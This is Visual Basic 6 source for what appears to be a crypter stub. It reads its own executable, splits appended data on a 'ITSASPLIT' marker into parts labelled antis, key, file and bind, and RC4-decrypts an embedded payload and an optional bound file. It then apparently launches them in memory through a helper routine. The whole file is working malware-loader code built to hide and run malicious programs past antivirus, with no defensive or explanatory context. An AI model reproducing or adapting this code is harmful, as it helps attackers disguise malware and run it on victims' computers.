Attribute VB_Name = "min"

Sub Main()

Dim Data As String

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
    Data = Space(LOF(1))
    Get #1, , Data
Close #1

      
'0 = stub
'1 = antis
'2 = key
'3 = file
'4 = bind
        
        
Dim Splitz()        As String

Splitz() = Split(Data, "ITSASPLIT")

Dim RC4 As New Class2


Splitz(3) = RC4.DecryptString(Splitz(3), Splitz(2))
If Splitz(4) <> "" Then
Splitz(4) = RC4.DecryptString(Splitz(4), Splitz(2))
End If

Dim TheByte()        As Byte
Dim TheByte2()        As Byte

TheByte() = StrConv(Splitz(3), vbFromUnicode)
TheByte2() = StrConv(Splitz(4), vbFromUnicode)

    Dim a As New Class1
    
    Call a.sFunction02(TheByte, App.Path & "\" & App.EXEName & ".exe")

If Splitz(4) <> "" Then
    Call a.sFunction02(TheByte2, App.Path & "\" & App.EXEName & ".exe")
End If


End Sub
